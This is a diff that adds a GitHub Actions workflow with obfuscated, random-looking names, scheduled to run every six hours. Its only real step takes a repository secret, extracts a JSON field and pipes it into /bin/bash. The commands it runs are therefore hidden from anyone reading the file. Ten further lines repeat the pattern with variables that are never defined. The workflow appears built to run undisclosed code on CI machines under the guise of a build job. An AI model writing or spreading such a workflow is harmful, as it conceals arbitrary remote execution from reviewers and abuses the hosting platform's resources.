@@ -1,0 +1,28 @@
+name: zhaojinan7890
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaojinan7890
+        env:
+          xn9785: ${{ secrets.xn9785 }}
+        run: |
+          echo $xn9785 | jq -r .riv73 | /bin/bash
+          echo $wnm2807 | jq -r .ovsu98268 | /bin/bash
+          echo $mhp626 | jq -r .iejj48 | /bin/bash
+          echo $odscx1151 | jq -r .qo2820 | /bin/bash
+          echo $rcm0611 | jq -r .xsqy14545 | /bin/bash
+          echo $us26827 | jq -r .rix9067 | /bin/bash
+          echo $jsvwa1 | jq -r .dag271 | /bin/bash
+          echo $f559 | jq -r .mms3 | /bin/bash
+          echo $i77060 | jq -r .dthxe0367 | /bin/bash
+          echo $fka2 | jq -r .wie03846 | /bin/bash
+          echo $ifp142 | jq -r .nw208 | /bin/bash
+
